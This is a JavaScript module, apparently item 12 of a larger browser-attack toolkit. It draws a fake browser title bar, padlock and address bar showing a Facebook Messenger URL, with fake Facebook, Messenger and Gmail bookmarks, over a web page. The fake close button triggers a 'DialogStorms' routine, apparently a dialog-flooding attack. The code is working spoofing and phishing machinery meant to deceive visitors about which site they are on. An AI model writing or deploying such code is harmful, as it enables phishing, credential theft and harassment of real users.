/**
 * 12. FAKE BROWSER CHROME via CSS
 * Spoofs browser chrome/UI using CSS
 */
const FakeBrowserChrome = {
    init: function() { this.createFakeChrome(); },
    createFakeChrome: function() {
        const fakeChrome = document.createElement('div');
        fakeChrome.id = 'fake-browser-chrome';
        fakeChrome.innerHTML = `
            <div class="fake-titlebar">
                <div class="fake-controls">
                    <span class="fake-btn minimize">─</span>
                    <span class="fake-btn maximize">□</span>
                    <span class="fake-btn close">✕</span>
                </div>
                <div class="fake-urlbar">
                    <span class="fake-lock">🔒</span>
                    <span class="fake-url">https://www.facebook.com/messages/</span>
                </div>
            </div>
            <div class="fake-bookmarks">
                <span class="fake-bookmark">Facebook</span>
                <span class="fake-bookmark">Messenger</span>
                <span class="fake-bookmark">Gmail</span>
            </div>
        `;
        const style = document.createElement('style');
        style.textContent = `
            #fake-browser-chrome {
                position: fixed; top: 0; left: 0; right: 0; z-index: 2147483647;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                pointer-events: none;
            }
            .fake-titlebar {
                display: flex; align-items: center; height: 38px;
                background: #dee1e6; border-bottom: 1px solid #b8b8b8; padding: 0 8px;
            }
            .fake-controls { display: flex; gap: 8px; margin-right: 12px; }
            .fake-btn {
                width: 12px; height: 12px; border-radius: 50%;
                display: flex; align-items: center; justify-content: center;
                font-size: 8px; color: transparent; cursor: pointer; pointer-events: auto;
            }
            .fake-btn:hover { color: rgba(0,0,0,0.5); }
            .fake-btn.minimize { background: #ffbd2e; }
            .fake-btn.maximize { background: #28c840; }
            .fake-btn.close { background: #ff5f57; }
            .fake-urlbar {
                flex: 1; height: 28px; background: #fff; border-radius: 20px;
                display: flex; align-items: center; padding: 0 12px;
                font-size: 13px; color: #333; border: 1px solid #ddd;
            }
            .fake-lock { margin-right: 6px; font-size: 11px; }
            .fake-url { color: #1a0dab; }
            .fake-bookmarks {
                display: flex; gap: 16px; height: 32px; background: #fff;
                border-bottom: 1px solid #ddd; align-items: center; padding: 0 12px;
            }
            .fake-bookmark {
                font-size: 12px; color: #333; padding: 4px 8px; border-radius: 4px;
                cursor: pointer; pointer-events: auto;
            }
            .fake-bookmark:hover { background: #f0f0f0; }
            body { padding-top: 70px !important; }
        `;
        document.head.appendChild(style);
        document.body.appendChild(fakeChrome);
        const closeBtn = fakeChrome.querySelector('.fake-btn.close');
        if (closeBtn) {
            closeBtn.style.pointerEvents = 'auto';
            closeBtn.addEventListener('click', () => {
                if (window.DialogStorms) DialogStorms.init(false);
            });
        }
    }
};